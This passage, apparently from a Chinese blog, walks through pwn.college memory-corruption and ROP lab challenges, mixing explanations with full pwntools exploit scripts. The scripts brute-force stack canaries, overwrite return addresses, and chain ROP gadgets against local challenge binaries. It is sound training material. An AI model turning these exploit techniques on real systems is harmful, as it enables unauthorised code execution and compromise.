<span class="hljs-number">0x7ffffffd</span><br><span class="hljs-keyword">Out</span>[<span class="hljs-number">3</span>]: <span class="hljs-number">4611686001247518735</span><br></code></pre></td></tr></table></figure><p>两个很大的正数，相乘可以是一个很小的数。而最后相乘的时候因为第一个数强制转换为64位的数，因此到read那儿又是一个很大的数。</p><p>这两个数分别为<code>2147483643,2147483645</code>。因此输入，即可绕过前面的验证，且到最后依然是一个很大的数。因此exp就很好写了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-4-1&#x27;, &#x27;b main&#x27;)</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-5-0&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>number = <span class="hljs-string">b&#x27;2147483643&#x27;</span><br>size = <span class="hljs-string">b&#x27;2147483645&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;send: &#x27;</span>, number)<br>p.sendlineafter(<span class="hljs-string">&#x27;record: &#x27;</span>, size)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">56</span><br>payload += p64(<span class="hljs-number">0x401edc</span>)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-built_in">print</span>(p.recvall())  <br><span class="hljs-comment"># p.interactive()</span><br>p.close()<br></code></pre></td></tr></table></figure><h4 id="level5-1-1"><a href="#level5-1-1" class="headerlink" title="level5.1"></a>level5.1</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x40178f</span> &lt;challenge+<span class="hljs-number">460</span>&gt;    ret    &lt;<span class="hljs-number">0</span>x6261616362616162&gt;<br></code></pre></td></tr></table></figure><p>没啥好说的，还是计算padding就能过。</p><h4 id="level9-0-1"><a href="#level9-0-1" class="headerlink" title="level9.0"></a>level9.0</h4><p>这一关PIE和Canary都开了</p><blockquote><p>中间关卡应该也是被删了。直接来到了level9.0</p></blockquote><p>这道题有一个变量n来帮助跳过canary，然后PIE的话，偏移不变，那么我们爆破返回地址的最后两个字节即可。exp：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br># context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br># p = gdb.debug(<span class="hljs-string">&#x27;/challenge/babymem-level-9-0&#x27;</span>, <span class="hljs-string">&#x27;b challenge&#x27;</span>)<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-9-0&#x27;</span>)<br>    payload = b<span class="hljs-string">&#x27;&#x27;</span><br>    # number = b<span class="hljs-string">&#x27;2147483643&#x27;</span><br>    size = b<span class="hljs-string">&#x27;58&#x27;</span><br>    # p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, number)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload += b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p8(<span class="hljs-number">55</span>)+ p8(<span class="hljs-number">0x53</span>) + p8(<span class="hljs-number">0x1a</span>)<br>    # payload += p64(<span class="hljs-number">0x4014c4</span>)<br>    <br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><br>    out=p.recvall()<br>    p.close()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        break<br>    # print(p.recvall())  <br>    # p.interactive()<br>print(out.decode())<br></code></pre></td></tr></table></figure><p>通过debug我们可以看到填充的第37个字节是变量n，然后后续就是两个地址，这两个是偏移地址。但是不是win函数的地址，而是win函数中flag_open的地址。这样我们就不需要考虑win函数的参数问题，从而能够直接拿到flag了。</p><h4 id="level9-1-1"><a href="#level9-1-1" class="headerlink" title="level9.1"></a>level9.1</h4><p>通过gdb知道，size的地址为<code>0x7ffe2199ed88</code>，buf的首地址为<code>0x7ffe2199eda0</code>。经过调试后发现n为覆盖的第25个字节。随后找ret地址。以及win函数中open的地址。（通过IDA会更快）</p><p>ret地址在<code>0x7ffe2199edd8</code>，那么需要让n&#x3D;55，然后win中的open地址为：<code>0x00005ffe18dad457</code></p><p>而ret的main地址为<code>0x5ffe18dad76b</code>。因此可以确定最后爆破的四位可以为<code>0xd457</code>。</p><h4 id="level10-0-1"><a href="#level10-0-1" class="headerlink" title="level10.0"></a>level10.0</h4><p>flag存在input_buf后面，然后最后又会有一个<code>you said</code>，把我们输入到memory中的内容打印出来。我们只需要不覆盖flag，并且把flag与input_buf中间的<code>\0</code>都覆盖掉。那么就会顺带把flag打印出来。</p><h4 id="level10-1-1"><a href="#level10-1-1" class="headerlink" title="level10.1"></a>level10.1</h4><p>flag_buf: <code>0x7ffd2f64dc91</code></p><p>input_buf:<code>0x7ffd2f64dc30</code></p><p>差距为<code>0x61</code>，因此直接cyclic 97，然后输入即可。</p><h4 id="level11-0-1"><a href="#level11-0-1" class="headerlink" title="level11.0"></a>level11.0</h4><p>这道题，别用cyclic，直接用pwntools脚本，然后<code>payload = b&#39;a&#39;*32768</code></p><h4 id="level11-1-1"><a href="#level11-1-1" class="headerlink" title="level11.1"></a>level11.1</h4><p>flag_buf : <code>0x77f299049000</code></p><p>input_buf : <code>0x77f299041000</code></p><p>脚本都没改…我怀疑我是不是走捷径了…但是这样做出来好像也没问题。就是yan课上所讲的东西。</p><h4 id="level12-0-1"><a href="#level12-0-1" class="headerlink" title="level12.0"></a>level12.0</h4><p>最后四位<code>0x23EC</code>，我们要做的是，通过覆盖canary的最低位的两位<code>0x00</code>，然后使得能够把canary泄露出来。再REPEAT后，使用泄露的canary覆盖原来的canary使其不变。最后覆盖ret_addr就行，并且覆盖ret_addr的最后两个字节进行爆破。最后的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-9-1&#x27;, &#x27;b challenge&#x27;)</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-12-0&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-comment"># number = b&#x27;2147483643&#x27;</span><br>    size = <span class="hljs-string">b&#x27;25&#x27;</span><br>    <span class="hljs-comment"># p.sendlineafter(&#x27;size: &#x27;, number)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">19</span><br>    <span class="hljs-comment"># payload += p64(0x4014c4)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br>    substr = <span class="hljs-string">b&#x27;You said: REPEAT&#x27;</span><br>    out = p.recvuntil(<span class="hljs-string">b&#x27;aaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>    canary = u64(p8(<span class="hljs-number">0x00</span>) + p.recv(<span class="hljs-number">7</span>))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:------------------&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>    size = <span class="hljs-string">b&#x27;42&#x27;</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    <span class="hljs-comment"># pause()</span><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p16(<span class="hljs-number">0x23EC</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br>    out = p.recvall()<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(out)<br>p.interactive()<br><span class="hljs-comment"># print(out.decode())</span><br></code></pre></td></tr></table></figure><h4 id="level12-1-1"><a href="#level12-1-1" class="headerlink" title="level12.1"></a>level12.1</h4><p>win中的open偏移为<code>0x13D0</code></p><p>用gdb调试出偏移地址，当然也可以用IDA看偏移地址。</p><p>最后exp还是上一题的。改一改偏移即可。</p><h4 id="level13-0-1"><a href="#level13-0-1" class="headerlink" title="level13.0"></a>level13.0</h4><p>这题，发现flag依然在input_buf后面的可写memory中，因此依然是覆盖到flag，然后泄露出flag即可。</p><h4 id="level13-1-1"><a href="#level13-1-1" class="headerlink" title="level13.1"></a>level13.1</h4><p>gdb调试一下，查看flag地址：<code>0x7ffe29d119f8</code>，查看input_buf的地址：<code>0x7ffe29d11980</code></p><p>算出padding：<code>0xf8-0x80 = 120</code></p><p>然后就能泄露flag了。</p><h4 id="level14-0-1"><a href="#level14-0-1" class="headerlink" title="level14.0"></a>level14.0</h4><p>这道题，题目提示有东西没有被初始化。然后在栈上发现了残留的canary。然后算偏移就行了。尝试在gdb中调试查看到是在challenge中使得我们Repeat后的栈空间残留下来canary。不过不重要了，记住一点：栈复用是有可能存在残留数据可利用的。</p><p>exp:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs autoit">from pwn import *<br><span class="hljs-meta"># context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])</span><br><span class="hljs-meta"># p = gdb.debug(<span class="hljs-string">&#x27;/challenge/babymem-level-9-1&#x27;</span>, <span class="hljs-string">&#x27;b challenge&#x27;</span>)</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-14-0&#x27;</span>)<br>    <span class="hljs-meta">#payload = b<span class="hljs-string">&#x27;&#x27;</span></span><br>    <span class="hljs-meta"># number = b<span class="hljs-string">&#x27;2147483643&#x27;</span></span><br>    size = b<span class="hljs-string">&#x27;57&#x27;</span><br>    <span class="hljs-meta"># p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, number)</span><br>    <span class="hljs-meta"># pause()</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload = b<span class="hljs-string">&#x27;REPEAT&#x27;</span> + b<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">51</span>)<br>    <span class="hljs-meta"># payload += p64(0x4014c4)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><br>    out = p.recvuntil(b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">51</span>))<br>    canary = u64(p8(<span class="hljs-number">0x00</span>) + p.recv(<span class="hljs-number">7</span>))<br><br>    print(<span class="hljs-string">&quot;canary:------------------&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>    size = b<span class="hljs-string">&#x27;346&#x27;</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload = b<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-meta"># pause()</span><br>    payload += b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x148</span> + p64(canary) + b<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p16(<span class="hljs-number">0xBEFB</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br>    out = p.recvall()<br>    p.close()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">break</span><br>print(out) <br><span class="hljs-meta"># p.interactive()</span><br><span class="hljs-meta"># print(out.decode())</span><br></code></pre></td></tr></table></figure><h4 id="level14-1-1"><a href="#level14-1-1" class="headerlink" title="level14.1"></a>level14.1</h4><p>通过gdb调试出input_buf和残留canary之间的偏移：<code>0x7ffe2b972e38 - 0x7ffe2b972da0  </code></p><p>即0x98，再+1即覆盖低位00能够泄露。然后脚本依然是上面那个，改改偏移即可。</p><h4 id="level15-0-1"><a href="#level15-0-1" class="headerlink" title="level15.0"></a>level15.0</h4><p>这道题我就直接按照不会给stack来做了。所以，直接IDA打开，查看偏移地址。然后直接开始爆破就行。需要爆破Canary以及ret_addr的倒数第二个字节。exp：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">from pwn <span class="hljs-keyword">import</span> *<br># context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br># p = gdb.debug(<span class="hljs-string">&#x27;/challenge/babymem-level-9-1&#x27;</span>, <span class="hljs-string">&#x27;b challenge&#x27;</span>)<br>x = <span class="hljs-number">0x01</span><br>tmp = b<span class="hljs-string">&#x27;&#x27;</span><br>canary = p8(<span class="hljs-number">0x00</span>)<br>length = [b<span class="hljs-string">&#x27;122&#x27;</span>,b<span class="hljs-string">&#x27;123&#x27;</span>, b<span class="hljs-string">&#x27;124&#x27;</span>, b<span class="hljs-string">&#x27;125&#x27;</span>, b<span class="hljs-string">&#x27;126&#x27;</span>, b<span class="hljs-string">&#x27;127&#x27;</span>, b<span class="hljs-string">&#x27;128&#x27;</span>]<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> True:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    payload = b<span class="hljs-string">&#x27;&#x27;</span><br>    payload += length[i]<br>    p.sendlineafter(b<span class="hljs-string">&#x27;ize: &#x27;</span>, payload)<br>    padding = b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">120</span><br>    tmp = canary<br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    print(payload)<br>    p.sendafter(b<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>, payload)<br>    <span class="hljs-keyword">out</span> = p.recvall()<br>    # print(<span class="hljs-keyword">out</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;terminated&#x27;</span> not <span class="hljs-keyword">in</span> <span class="hljs-keyword">out</span>:<br>        canary += y<br>        <span class="hljs-keyword">if</span> len(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        i += <span class="hljs-number">1</span><br>        x = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">continue</span><br>print(<span class="hljs-string">&quot;canary:&quot;</span>, canary)<br>x = <span class="hljs-number">0x01</span><br><span class="hljs-keyword">while</span> True:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    payload = b<span class="hljs-string">&#x27;138&#x27;</span><br>    p.sendlineafter(b<span class="hljs-string">&#x27;ize: &#x27;</span>, payload)<br>    padding = b<span class="hljs-string">&#x27;a&#x27;</span> *<span class="hljs-number">120</span><br>    payload = padding + canary + b<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p8(<span class="hljs-number">0x95</span>) + p8(x)<br>    x +=<span class="hljs-number">1</span><br>    p.sendafter(b<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>, payload)<br>    <span class="hljs-keyword">out</span> = p.recvall()<br>    p.close()<br>    print(<span class="hljs-keyword">out</span>)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">out</span>:<br>        <span class="hljs-keyword">break</span><br>print(<span class="hljs-keyword">out</span>)<br><br></code></pre></td></tr></table></figure><p>这exp写的挺丑陋的O.o…那就再说一下思路吧：</p><blockquote><p>canary需要爆破，那么最低字节为0x00不用动，然后因为程序会根据canary是否被修改而反馈，所以依据反馈来判断当前覆盖的字节是否是canary的值。因此可以爆破出canary。（其次的原因是因为fork会继承父进程的canary，这个yan在视频里讲了就不赘述）</p><p>然后IDA打开，查看我们输入的buf的偏移（这里要注意，不是IDA打开的buf变量，因为buf在后面被赋值了一个变量，那个变量的偏移才是需要的偏移。）最后爆破ret_addr的倒数第二个字节就行了。</p></blockquote><h4 id="level15-1-1"><a href="#level15-1-1" class="headerlink" title="level15.1"></a>level15.1</h4><p>同15.1，只需要修改偏移地址而已。</p><h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h3><p>一条用得很多的找gadgets的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ROPgadget --binary rop --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="level1-0-1"><a href="#level1-0-1" class="headerlink" title="level1.0"></a>level1.0</h4><p>简单的栈溢出，直接覆盖返回地址为win函数地址即可。</p><h4 id="level1-1-1"><a href="#level1-1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>win():<code>0x4019e7</code>，buf:<code>0x7ffc739ba520</code>，rbp:<code>0x7ffc739ba540</code></p><p>padding：<code>0x20 + 8</code></p><h4 id="level2-0-1"><a href="#level2-0-1" class="headerlink" title="level2.0"></a>level2.0</h4><p>win_stage_1():<code>0x401cbe</code></p><p>win_stage_2():<code>0x401d6b</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level2.0&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(<span class="hljs-number">0x401cbe</span>) + p64(<span class="hljs-number">0x401d6b</span>)<br>p.send(payload)<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure><h4 id="level2-1-1"><a href="#level2-1-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>input_buf: <code>0x7fffca103c80</code>, rbp: <code>0x7fffca103cb0</code></p><p>padding &#x3D; 0xb0 - 0x80 + 8&#x3D; 0x38</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; <span class="hljs-keyword">b </span>win_stage_1<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">2</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x401a4a</span><br>pwndbg&gt; <span class="hljs-keyword">b </span>win_stage_2<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">3</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x401af7</span><br></code></pre></td></tr></table></figure><h4 id="level3-0-1"><a href="#level3-0-1" class="headerlink" title="level3.0"></a>level3.0</h4><p>padding &#x3D; 0x40+ 8 &#x3D; 0x48</p><p>题目要求：stage1需要把参数设置为1，stage2需要把参数设置为2以此类推，总共五个stage。那么我们需要找到<code>pop rsi; ret</code>。用ROPgadget试试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level3-0:/challenge$ ROPgadget --binary ./babyrop_level3.0 --only <span class="hljs-string">&#x27;ret|pop&#x27;</span> | grep <span class="hljs-string">&#x27;rdi&#x27;</span><br>0x0000000000402663 : pop rdi ; ret<br></code></pre></td></tr></table></figure><p>那就很简单了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level3.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span><br>stage_1 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x401fd6</span>)<br>stage_2 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x40227b</span>)<br>stage_3 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x3</span>) + p64(<span class="hljs-number">0x401ef4</span>)<br>stage_4 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x402195</span>)<br>stage_5 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x5</span>) + p64(<span class="hljs-number">0x4020b2</span>)<br><br>payload = padding + stage_1 + stage_2 + stage_3 + stage_4 + stage_5<br>pause()<br>p.send(payload)<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure><h4 id="level3-1-1"><a href="#level3-1-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>buf: <code>0x7ffe2d71b370</code>, rbp: <code>0x7ffe2d71b3c0</code>, padding &#x3D; <code>0xc0 - 0x70 + 8 </code> &#x3D; <code>0x58</code> </p><p>gadget：<code>0x0000000000402093</code></p><h4 id="level4-0-2"><a href="#level4-0-2" class="headerlink" title="level4.0"></a>level4.0</h4><blockquote><p><strong>ASLR和PIE</strong></p><p>PIE(Position-Independent Executable)是一种编译选项，使得可执行文件可以在内存任意位置运行，代码不是固定地址。工作原理：1. 使用相对地址而非绝对地址。2. 编译器生成位置无关代码，链接器生成可执行文件。 3. 加载时确定实际地址，并进行重新定位。</p><p>ASLR(Address Space Layout Randomization)是一种安全技术，通过随机化进程内存布局（如栈、堆、共享库等）的地址，增加攻击者预测内存地址的难度，从而放至缓冲区溢出等攻击。工作原理：1. 随机化对象：栈、堆、共享库、内存映射等。2. 操作系统在加载程序时，随机化各内存区域的基址。3. 随机化粒度：通常以内存页（如4KB）为单位。</p><p>ASLR是操作系统层面的技术，随机化内存布局。PIE是编译和链接层面的技术，生成与位置无关的代码。PIE使ASLR更有效，ASLR为PIE提供随机化支持。</p></blockquote><p>这题开启了ASLR。但是它给了一个[leak]，也就是把buf的地址给我们了。然后没有win函数，得自己构造了。由于之前shellcode那一章已经是很早之前做的了，有点不记得了。直接看一下shellcode的level1就行。然后就是ROPgadget找对应的指令就行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rdi&#x27;</span><br>0x00000000004026c6 : pop rdi ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rsi&#x27;</span><br>0x0000000000402981 : pop rsi ; pop r15 ; ret<br>0x00000000004026ae : pop rsi ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rax&#x27;</span><br>0x0000000000402697 : pop rax ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;syscall&quot;</span><br>Gadgets information<br>============================================================<br>0x00000000004026b6 : syscall<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span 